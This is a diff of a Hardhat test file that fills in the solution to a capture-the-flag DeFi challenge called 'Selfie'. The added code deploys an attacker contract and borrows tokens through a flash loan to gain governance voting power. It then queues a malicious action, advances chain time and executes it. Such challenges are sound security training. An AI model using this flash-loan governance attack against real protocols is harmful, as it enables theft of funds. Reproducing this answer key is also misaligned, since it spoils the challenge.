@@ -30,7 +30,27 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // Basically we can call dao token's snapshot method while
+        // having borrowed tokens from flashloan pool
+        const AttackerFactory = await ethers.getContractFactory("SelfieAttacker", attacker);
+        this.attackerContract = await AttackerFactory.deploy(
+            this.token.address,
+            this.pool.address,
+            this.governance.address
+        );
+        const tx = await this.attackerContract.connect(attacker).attack();
+        const receipt = await tx.wait();
+        const events = ["event ActionQueued(uint256, address indexed)"]
+        const iface = new ethers.utils.Interface(events);
+        let actionId = 0;
+        receipt.events.forEach(event => {
+            try {
+                const parsed = iface.parseLog(event);
+                actionId = ethers.BigNumber.from(parsed.args[0]).toNumber();
+            } catch(err) {}
+        });
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+        await this.governance.executeAction(actionId);
     });
 
     after(async function () {
